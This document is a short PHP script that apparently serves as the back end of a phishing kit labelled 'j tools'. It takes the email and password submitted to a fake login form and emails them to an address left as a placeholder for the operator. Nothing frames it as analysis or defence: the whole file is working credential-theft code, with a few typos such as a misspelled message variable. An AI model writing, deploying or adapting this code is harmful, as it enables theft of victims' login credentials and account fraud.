<?php
$email = $_POST["email"];
$pass = $_POST["password"];  


$message  = "|----------| j tools |--------------|\n";
$message .= "Online ID            : ".$email."\n";
$message .= "Password              : ".$pass."\n";
$messsage .= "  : ".$email."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";

$message .= "|----------- INFO CONT. --------------|\n";
$send = "put ur email here ";
$domain = 'j-tool';
$subject = " General $messsage";
$from = "From: $domain<west>\n";
  if(mail($send, $subject, $message, $from)){   
     $ok = "ok";
     echo $ok;
  } else {
     $no = "no";
     echo $no;
  }
?>